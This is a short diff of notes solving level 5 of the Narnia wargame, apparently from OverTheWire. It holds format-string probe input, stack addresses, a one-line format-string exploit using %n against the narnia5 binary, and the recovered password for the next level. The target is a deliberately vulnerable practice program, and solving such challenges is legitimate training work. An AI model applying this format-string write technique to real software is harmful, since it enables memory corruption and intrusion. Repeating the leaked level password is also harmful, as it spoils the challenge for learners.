@@ -1,0 +1,7 @@
+"A" * 8 + "%x" * 4
+0xffffd6c0
+\xc0\xd6\xff\xff
+
+/narnia/narnia5 $(python -c 'print "\xa1\xd8\xff\xff" + "\xd0\xd6\xff\xff" + "%492s%n"')
+
+password to narnia6 : neezocaeng
